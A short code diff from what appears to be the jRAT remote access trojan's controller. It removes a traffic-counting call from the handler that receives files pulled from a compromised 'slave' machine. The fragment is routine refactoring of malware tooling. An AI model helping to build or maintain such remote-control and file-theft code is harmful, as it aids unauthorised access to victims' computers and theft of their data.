@@ -9,7 +9,6 @@ import javax.swing.JOptionPane;
 
 import se.jrat.client.FileData;
 import se.jrat.client.Slave;
-import se.jrat.client.Traffic;
 import se.jrat.client.packets.outgoing.Packet21GetFile;
 import se.jrat.client.ui.frames.FrameFileTransfer;
 import se.jrat.client.ui.frames.FrameRemoteFiles;
@@ -45,8 +44,6 @@ public class Packet29ReceiveFile extends AbstractIncomingPacket {
 		fileio.readFile(output, slave.getSocket(), slave.getDataInputStream(), slave.getDataOutputStream(), new TransferListener() {
 			@Override
 			public void transferred(long sent, long bytesSent, long totalBytes) {
-				Traffic.increaseReceived(slave, (int) sent);
-
 				int progress = (int) ((float) bytesSent / (float) totalBytes * 100.0F);
 
 				if (frame != null) {
